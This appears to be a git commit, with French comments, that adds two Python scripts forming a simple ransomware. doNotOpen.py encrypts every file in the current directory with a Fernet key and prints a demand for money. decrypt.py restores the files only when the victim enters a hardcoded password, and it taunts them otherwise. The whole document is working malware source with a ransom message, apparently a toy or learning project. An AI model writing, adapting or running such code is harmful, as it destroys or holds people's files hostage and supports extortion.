57b9a6e95bad5f80acf1bbb99c7908ffc6164dd8
Amine1102 <amine.laimeche@gmail.com>
2022-06-15 00:50:06 +0200

    Ajout des 2 scripts

---
+++ decrypt.py
@@ -0,0 +1,44 @@
+import os
+from cryptography.fernet import Fernet
+
+
+#On a besoin d'un mot de passe pour decrypter
+mdp = "bon toutou"
+#Ce que doit trouver l'utilisateur
+mdp_input = input("Entrez le mot de passe pour décrypter vos données\n") 
+#Le mdp que l'utilisateur entre
+
+#Tout ceci est utilisé un peu plus tard dans le code
+
+
+
+
+fichiers = []
+
+
+for file in os.listdir(): #crée une liste de fichiers à crypter
+	if file == "doNotOpen.py" or file == "theKey.key" or file =="decrypt.py":
+		continue
+ #A modifier si on crypte le ransomware ou la clé par erreur 
+	if os.path.isfile(file):     #On veut crypter  uniquement les fichiers
+		fichiers.append(file)
+
+
+
+with open("theKey.key", "rb") as key:
+	cleSecrete = key.read()     
+#On recupere la clé dans cleSecrete
+
+
+
+if mdp == mdp_input:
+	for file in fichiers:
+		with open(file,"rb") as theFile:   #rb = read
+			data = theFile.read()   # Save le contenu du fichier dans "data"
+		data_decrypted = Fernet(cleSecrete).decrypt(data) #Permet de DEcrypter data avec la clé
+		with open(file,"wb") as theFile:		# wb = write
+			theFile.write(data_decrypted)
+  #La dernire ligne remplace le contenue du fichier  par data_decrypted
+	print("Merci d'avoir payé, vos fichiers sont maintenant décrypté")
+else:
+	print("Paye espece de rat :)")
---
+++ doNotOpen.py
@@ -0,0 +1,35 @@
+import os
+from cryptography.fernet import Fernet
+
+# Rechercher les fichiers a crypter
+
+fichiers = []
+
+for file in os.listdir():
+	if file == "doNotOpen.py" or file == "theKey.key" or file =="decrypt.py":
+		continue
+ #Ca serait bête de crypter le ransomware ou le fichier contenant la clé ou le decrypteur  :)
+	if os.path.isfile(file):     #On veut crypter  uniquement les fichiers
+		fichiers.append(file)
+
+
+
+key = Fernet.generate_key() #Vraiment besoin de commentaire ? 
+
+
+
+with open("theKey.key","wb") as theKey:   #Crée un fichier et save la clef dedans
+	theKey.write(key)
+
+
+
+for file in fichiers:             #Pour chaque fichier de la liste
+	with open(file,"rb") as theFile:   #rb = read
+		data = theFile.read()   # Save le contenu du fichier dans "data"
+	data_encrypted = Fernet(key).encrypt(data)  #Permet de crypter data avec la clé
+	with open(file,"wb") as theFile:		# wb = write
+		theFile.write(data_encrypted) 
+	# la derniere ligne remplace le contenue du fichier  par data_encrypted
+
+print("Tous vos fichiers ont été crypté, merci de m'envoyer beaucoup d'argent")
+print("Verifiez avec un 'cat nomfichier' :)")
